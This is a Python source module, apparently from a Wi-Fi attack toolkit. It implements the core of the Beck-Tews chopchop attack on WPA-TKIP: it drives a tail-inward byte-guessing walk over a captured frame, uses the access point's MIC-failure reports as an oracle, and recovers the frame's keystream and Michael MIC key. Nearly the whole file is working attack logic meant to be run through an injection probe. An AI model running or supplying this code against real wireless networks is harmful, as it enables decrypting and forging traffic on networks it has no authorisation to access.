"""Beck-Tews recovery core: keystream + Michael-key recovery for one TKIP frame.

The Beck-Tews chopchop against TKIP walks a captured frame from the tail inward,
one byte per accepted guess, using the AP's MIC-failure report as a boolean
ICV-validity oracle (no key needed, exactly as WEP chopchop). The recovered
plaintext is ``payload || MIC(8) || ICV(4)``; keystream is ``cipher XOR
plaintext``, and the 8-byte Michael key falls out by running Michael backwards
over the recovered MSDU payload and MIC.

Pure/offline: ``tests/crack/test_tkip_beck_tews.py`` proves recovery against a
synthetic frame built under a known TK, Michael key and TSC.
"""

from __future__ import annotations

from dataclasses import dataclass
from typing import Awaitable, Callable

from wifang.dot11.michael import michael_key_from_mic
from wifang.dot11.wep.crypto import chop_last_byte_and_fixup

_MIC_LEN = 8
_ICV_LEN = 4


@dataclass
class Recovered:
    """One frame's Beck-Tews result: the per-packet keystream, the 8-byte
    Michael key, and the TSC the keystream belongs to."""

    keystream: bytes
    mic_key: bytes
    tsc: int


def _michael_input(da: bytes, sa: bytes, priority: int, payload: bytes) -> bytes:
    return da + sa + bytes([priority & 0xFF]) + b"\x00\x00\x00" + payload


class BeckTewsWalk:
    """Tail-inward chop walk over one TKIP ciphertext body.

    ``next_guess_frame`` emits the next candidate to inject; feed the boolean
    MIC-failure result to ``on_oracle``. Stops at the known-plaintext floor."""

    def __init__(
        self,
        cipher: bytes,
        known_plaintext_prefix: bytes,
        *,
        da: bytes = b"",
        sa: bytes = b"",
        priority: int = 0,
        tsc: int = 0,
    ):
        self._cipher = bytes(cipher)
        self._body = bytes(cipher)
        self._prefix = bytes(known_plaintext_prefix)
        self._da = da
        self._sa = sa
        self._priority = priority
        self._tsc = tsc
        self._guess = 0
        self._keystream: dict[int, int] = {}

    @property
    def done(self) -> bool:
        return len(self._body) <= len(self._prefix)

    @property
    def bytes_done(self) -> int:
        return len(self._cipher) - len(self._body)

    def next_guess_frame(self) -> bytes:
        """The next candidate body to inject (chopped + ICV-fixed for the
        current guess), or empty once the floor is reached."""
        if self.done:
            return b""
        return chop_last_byte_and_fixup(self._body, self._guess)

    def on_oracle(self, fired: bool) -> None:
        """Feed the MIC-failure result for the last candidate: a fired oracle
        means the guess was the true plaintext byte, so chop and advance."""
        if self.done:
            return
        if fired:
            self._keystream[len(self._body) - 1] = self._body[-1] ^ self._guess
            self._body = chop_last_byte_and_fixup(self._body, self._guess)
            self._guess = 0
        else:
            self._guess += 1

    @property
    def recovered(self) -> Recovered:
        """The frame's keystream + Michael key + TSC (valid once ``done``)."""
        keystream = bytearray(len(self._cipher))
        for i, prefix_byte in enumerate(self._prefix):
            keystream[i] = self._cipher[i] ^ prefix_byte
        for position, value in self._keystream.items():
            keystream[position] = value
        plaintext = bytes(c ^ k for c, k in zip(self._cipher, keystream))
        payload = plaintext[: len(self._cipher) - _MIC_LEN - _ICV_LEN]
        mic = plaintext[len(payload): len(payload) + _MIC_LEN]
        mic_key = michael_key_from_mic(
            _michael_input(self._da, self._sa, self._priority, payload), mic
        )
        return Recovered(bytes(keystream), mic_key, self._tsc)


async def recover(
    cipher: bytes,
    prefix: bytes,
    probe: Callable[[bytes], Awaitable[bool]],
    *,
    da: bytes = b"",
    sa: bytes = b"",
    priority: int = 0,
    tsc: int = 0,
) -> Recovered:
    """Recover one TKIP frame's keystream and Michael key by driving the chop
    walk through ``probe`` (returns True on a MIC-failure = valid-ICV guess)."""
    walk = BeckTewsWalk(cipher, prefix, da=da, sa=sa, priority=priority, tsc=tsc)
    while not walk.done:
        walk.on_oracle(await probe(walk.next_guess_frame()))
    return walk.recovered
